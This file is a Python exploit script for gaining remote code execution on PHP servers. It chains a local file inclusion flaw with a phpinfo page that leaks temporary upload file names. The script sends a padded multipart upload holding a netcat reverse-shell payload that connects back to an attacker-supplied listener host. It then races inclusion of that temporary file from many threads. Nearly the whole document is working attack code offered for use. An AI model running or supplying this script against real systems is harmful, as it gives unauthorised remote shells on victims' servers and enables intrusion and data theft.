# -*- coding:utf-8 -*-

# LFI + PHPInfo RCE Exploit
# CVE: ???
# Exploit author: Gynvael Coldwind, Brett Moore
# http://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf
# https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
# Python script exploit author: nullarmor <nullarmor@protonmail.com>

import argparse
import socket
import sys
from multiprocessing.pool import ThreadPool as Pool

def main():
    
    # args
    argparser = argparse.ArgumentParser(description='LFI + PHPInfo RCE Exploit', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='Host IP address', required=True)
    
    main_arg.add_argument('--rport', type=int,
                            help='Host Port address', default=80)
    
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--lfiuripath', type=str,
                            help='LFI URI path', 
                            required=True)
    
    main_arg.add_argument('--phpinfouripath', type=str,
                            help='LFI URI path', 
                            default='phpinfo.php')
    
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    lhost = args.lhost
    lport = args.lport
    rhost = "http://" + args.rhost.replace('/', '')
    rport = args.rport
    url_phpinfo_post = "{}/{}?a=".format(rhost, args.phpinfouripath)
    url_lfi = "{}/{}".format(rhost, args.lfiuripath)
    shell_spawned = False
    
    # payload crafting
    padding = "A" * 6000
    rvshell_payload = """<?php echo exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f');?>""".format(lhost, lport)
    
    payload = """-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="shell"; filename="test.txt"\r
Content-Type: text/plain\r
\r
{}
-----------------------------7dbff1ded0714--\r""".format(rvshell_payload)
    
    request = """POST /{}?a={} HTTP/1.1\r
HTTP_ACCEPT: {}\r
HTTP_USER_AGENT: {}\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: {}\r
Host: {}\r
\r
{}""".format(args.phpinfouripath, padding, padding, padding, len(payload), rhost.replace('http://', ''), payload)
    
    lfi_request = """GET /{}%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: {}\r
\r
\r
""".format(args.lfiuripath, rhost)
    
    def phpinfo_post():
        global shell_spawned
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((rhost.replace('http://', ''), rport))
            s2.connect((rhost.replace('http://', ''), rport))
            
            s.send(request)
            
            page_html = ""
            
            while len(page_html) < 94683:
                page_html += s.recv(94683)
            else:
                tmp_file = page_html.split('[tmp_name] =&gt; ')[1].split('[error]')[0].replace(' ', '').replace('\n', '')
                lfi_request = """GET /{}{} HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: {}\r
\r
\r
""".format(args.lfiuripath, tmp_file, rhost.replace('http://', ''))
                s2.send(lfi_request)
                page_html = s2.recv(4096)
                s.close()
                s2.close()
        
        except Exception as e:
            print(e)
        else:
            if 'Failed' in page_html:
                pass
            else:
                print(" [*] Shell uploaded with success!!")
                shell_spawned = True
    
    pool = Pool(70)
    for index in range(500):
        if not shell_spawned:
            pool.apply_async(phpinfo_post, ())
        else: 
            pool.close()
            pool.join()
            print(" [*] DONE!")
            break
    
    else:
        pool.close()
        pool.join()
        print(" [*] DONE!")
    
    
    #phpinfo_post()
     
if __name__ == "__main__":
    main()
